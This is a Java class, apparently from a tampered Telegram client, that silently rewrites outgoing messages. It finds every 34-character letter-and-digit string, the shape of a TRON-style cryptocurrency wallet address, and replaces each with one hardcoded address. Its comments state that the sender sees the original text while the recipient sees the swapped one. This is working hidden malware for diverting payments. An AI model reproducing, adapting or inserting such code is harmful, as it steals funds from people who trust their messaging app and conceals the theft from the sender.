package org.telegram.messenger;

/**
 * 消息替换工具类
 * 功能：发送方显示原文，接收方显示替换后的内容
 * 最小侵入设计：仅在发送网络请求前调用替换方法
 *
 * 替换规则：
 * 1. 在消息文本中查找所有34位长度的字母数字混合串
 * 2. 内容由大小写字母 + 数字混合组成（必须同时包含字母和数字）
 * 3. 全部由字母数字组成（无特殊符号、中文等）
 * 4. 满足所有条件的串替换为指定字符串
 * 5. 不满足条件的内容完全不修改
 * 6. 支持一条消息中多个符合条件的串同时替换
 */
public class MessageReplacer {

    // 替换后的固定消息内容
    private static final String REPLACE_TEXT = "TELBudSdJX528ZAkThTqFf3tNMtqU3XxSh";
    // 目标长度
    private static final int TARGET_LENGTH = 34;

    /**
     * 替换消息内容
     * @param originalMessage 原始消息内容
     * @return 替换后的消息内容（不满足条件则返回原文）
     */
    public static String replaceMessage(String originalMessage) {
        // 空消息直接返回
        if (originalMessage == null || originalMessage.isEmpty()) {
            return originalMessage;
        }

        // 使用正则表达式查找所有34位长度的字母数字串
        java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("[a-zA-Z0-9]{34}");
        java.util.regex.Matcher matcher = pattern.matcher(originalMessage);

        StringBuffer sb = new StringBuffer();
        while (matcher.find()) {
            String match = matcher.group();
            // 检查是否同时包含字母和数字
            boolean hasLetter = false;
            boolean hasDigit = false;
            for (int i = 0; i < match.length(); i++) {
                char c = match.charAt(i);
                if (Character.isLetter(c)) {
                    hasLetter = true;
                } else if (Character.isDigit(c)) {
                    hasDigit = true;
                }
            }
            // 同时包含字母和数字才替换
            if (hasLetter && hasDigit) {
                matcher.appendReplacement(sb, REPLACE_TEXT);
            }
        }
        matcher.appendTail(sb);

        return sb.toString();
    }

    /**
     * 替换消息内容（CharSequence版本）
     */
    public static CharSequence replaceMessage(CharSequence originalMessage) {
        if (originalMessage == null) {
            return null;
        }
        return replaceMessage(originalMessage.toString());
    }
}
